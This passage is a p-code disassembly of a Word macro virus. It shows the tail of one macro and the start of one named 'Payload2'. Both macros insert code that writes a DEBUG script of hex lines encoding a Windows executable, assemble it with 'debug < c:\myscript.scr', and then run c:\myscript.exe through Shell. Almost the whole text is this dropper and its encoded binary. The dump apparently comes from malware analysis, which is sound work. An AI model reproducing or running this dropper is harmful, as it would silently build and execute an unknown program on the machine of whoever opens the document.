' 	LitStr 0x0037 "e 1fb0 a6 3b b8 3b c0 3b c6 3b cc 3b d4 3b e0 3b e6 3b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #498:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1fc0 ec 3b fb 3b 08 3c 19 3c 52 3c 6c 3c 75 3c 7e 3c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #499:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1fd0 87 3c 93 3c 9c 3c b6 3c c9 3c cf 3c de 3c ea 3c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #500:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1fe0 01 3d 0b 3d 22 3d 39 3d 43 3d 56 3d 6d 3d 8c 3d "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #501:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ff0 95 3d b1 3d c1 3d db 3d e5 3d eb 3d f7 3d 46 3e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #502:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2000 4f 3e 5a 3e 6c 3e 75 3e 87 3e 9f 3e b4 3e c7 3e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #503:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2010 d5 3e e2 3e ed 3e f5 3e fb 3e 01 3f 07 3f 11 3f "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #504:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2020 17 3f 1d 3f 23 3f 29 3f 2e 3f 3f 3f 45 3f 4b 3f "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #505:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2030 51 3f 57 3f 5d 3f 63 3f 6f 3f 7d 3f 84 3f 93 3f "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #506:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2040 99 3f a0 3f a7 3f b8 3f c1 3f f2 3f f9 3f e0 3f "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #507:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2050 e7 3f 00 00 00 20 00 00 54 00 00 00 0a 30 12 30 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #508:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2060 21 30 27 30 2f 30 3e 30 50 30 8c 30 92 30 b2 30 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #509:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2070 b8 30 be 30 c4 30 f1 30 12 31 49 30 56 30 69 30 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #510:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2080 76 30 9f 30 ab 30 ca 30 d1 30 e5 30 f9 30 04 31 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #511:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2090 0b 31 20 34 26 34 37 34 47 34 4d 34 70 34 9e 34 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #512:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 20a0 a9 34 bb 34 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #513:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 20b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #514:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 20c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #515:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 20d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #516:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 20e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #517:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 20f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #518:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "RCX"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #519:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "2000"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #520:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "W"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #521:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "Q"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #522:
' 	LitStr 0x0008 "Close #1"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #523:
' 	LineCont 0x0004 0C 00 00 00
' 	LitStr 0x0006 "Shell "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001D "debug < c:\myscript.scr > nul"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #524:
' 	LineCont 0x0004 0C 00 00 00
' 	LitStr 0x0006 "Shell "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0015 "c:\myscript.exe > nul"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #525:
' 	EndSub 
' Line #526:
' Macros/VBA/Payload2 - 91374 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn T
' Line #3:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St T$ 
' Line #4:
' 	LineCont 0x0004 11 00 00 00
' 	LitStr 0x0005 "Open "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "C:\myscript.scr"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0011 " For Output As #1"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #5:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0011 "n c:\myscript.exe"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #6:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0100 4d 5a 50 00 02 00 00 00 04 00 0f 00 ff ff 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #7:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0110 b8 00 00 00 00 00 00 00 40 00 1a 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #8:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #9:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #10:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0140 ba 10 00 0e 1f b4 09 cd 21 b8 01 4c cd 21 90 90 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #11:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0150 54 68 69 73 20 70 72 6f 67 72 61 6d 20 6d 75 73 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #12:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0160 74 20 62 65 20 72 75 6e 20 75 6e 64 65 72 20 57 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #13:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0170 69 6e 33 32 0d 0a 24 37 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #14:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #15:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #16:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #17:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #18:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #19:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #20:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #21:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #22:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0200 50 45 00 00 4c 01 04 00 8d 25 b3 49 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #23:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0210 00 00 00 00 e0 00 8e 81 0b 01 02 19 00 12 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #24:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0220 00 06 00 00 00 00 00 00 00 10 00 00 00 10 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #25:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0230 00 30 00 00 00 00 40 00 00 10 00 00 00 02 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #26:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0240 01 00 00 00 00 00 00 00 03 00 0a 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #27:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0250 00 60 00 00 00 04 00 00 00 00 00 00 02 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #28:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0260 00 00 10 00 00 20 00 00 00 00 10 00 00 10 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #29:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0270 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #30:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0280 00 40 00 00 ac 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #31:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
